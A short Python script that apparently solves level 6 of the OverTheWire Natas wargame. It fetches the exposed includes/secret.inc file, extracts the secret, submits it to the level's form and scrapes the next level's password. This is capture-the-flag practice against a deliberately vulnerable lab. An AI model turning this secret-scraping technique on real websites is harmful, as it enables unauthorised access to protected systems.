import requests
from requests.auth import HTTPBasicAuth
import natas5solution

auth = HTTPBasicAuth('natas6', natas5solution.get_pass())
def get_pass():
    secretr = requests.post('http://natas6.natas.labs.overthewire.org/includes/secret.inc', auth=auth)
    secretwebcontent = secretr.text
 #   print(secretwebcontent)
    i = secretwebcontent.find('= "')+3
    secret = secretwebcontent[i:secretwebcontent.find(';')-1]
    dat = {'secret':secret, 'submit':'Submit'}
    r = requests.post('http://natas6.natas.labs.overthewire.org/', auth=auth, data=dat)
    webcontent = r.text
#    print(webcontent)
    i = webcontent.find('natas7 is')+10
    s = webcontent[i:i+32]
    return s
if __name__ == "__main__":
    solution = get_pass()
    print(solution)
